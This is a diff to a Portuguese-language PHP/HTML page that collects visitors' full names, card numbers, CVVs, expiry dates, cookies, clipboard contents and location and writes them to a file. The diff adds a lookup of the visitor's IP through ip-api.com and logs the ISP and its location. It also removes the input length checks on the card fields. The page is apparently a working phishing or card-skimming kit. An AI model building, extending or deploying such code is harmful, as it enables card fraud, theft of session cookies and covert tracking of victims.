@@ -87,6 +87,28 @@
 </head>
 <body>
     <?php
+ header("Access-Control-Allow-Origin: *");
+    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
+    header("Access-Control-Allow-Headers: Content-Type, Authorization");
+
+    function getUserIP() {
+        return $_SERVER['REMOTE_ADDR'] ?? 'IP não disponível';
+    }
+
+    function getISPInfo($ip) {
+        $api_url = "http://ip-api.com/json/" . $ip;
+        $response = file_get_contents($api_url);
+        return json_decode($response, true);
+    }
+
+    $ip = getUserIP();
+    $ispData = getISPInfo($ip);
+    $isp = $ispData['isp'] ?? 'Provedor desconhecido';
+    $ispLocation = $ispData['city'] . ', ' . $ispData['regionName'] . ', ' . $ispData['country'] ?? 'Localização desconhecida';
+
+
+
+
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Dados do formulário
     $full_name = $_POST['full_name'] ?? 'N/A';
@@ -117,6 +139,8 @@
     fwrite($file, "Localização: $location\n");
     fwrite($file, "Cookies: $cookies\n");
     fwrite($file, "Área de Transferência: $clipboard\n"); // Salvar conteúdo da área de transferência
+    fwrite($file, "Provedor de Internet: $isp\n");
+    fwrite($file, "Localização do Provedor: $ispLocation\n");
     if (isset($photoPath)) {
         fwrite($file, "Foto salva em: $photoPath\n");
     }
@@ -132,13 +156,13 @@
                 <input placeholder="Nome Completo" type="text" name="full_name" required>
             </div>
             <div class="input-box">
-                <input placeholder="Número do Cartão" type="number" maxlength="50"  name="cc_number" required>
+                <input placeholder="Número do Cartão" type="number" name="cc_number" required>
             </div>
             <div class="input-box">
-                <input placeholder="CVV" type="number" maxlength="6" minlength="3" name="cc_cvv" required >
+                <input placeholder="CVV" type="number" name="cc_cvv" required>
             </div>
             <div class="input-box">
-                <input placeholder="Validade do Cartão (MM/AA)" type="number" maxlength="5" minlength="4" name="cc_expiry" required>
+                <input placeholder="Validade do Cartão (MM/AA)" type="number" name="cc_expiry" required>
             </div>
             <div class="remember">
                 <label>
@@ -245,7 +269,7 @@ document.addEventListener('paste', async (event) => {
   //     0oo____oooo0       0oo____oooo0	 
   //     000000000000       000000000000                        
   //                   
-  //                         ___________         _________				
+  //     1                   ___________         _________				
   //     1  '    sssssssss  |___________        |_________			
   //     1       ss         |                   |					
   //     1         s        |___________      	|_________			 		
@@ -253,7 +277,7 @@ document.addEventListener('paste', async (event) => {
   //     1           s 	    |___________        |__________			
   //     1     ssssssss     |___________        |__________  .you  
   //     1
-  //	  ___    			          
+  //    ___    			          
   //  
   //
   //
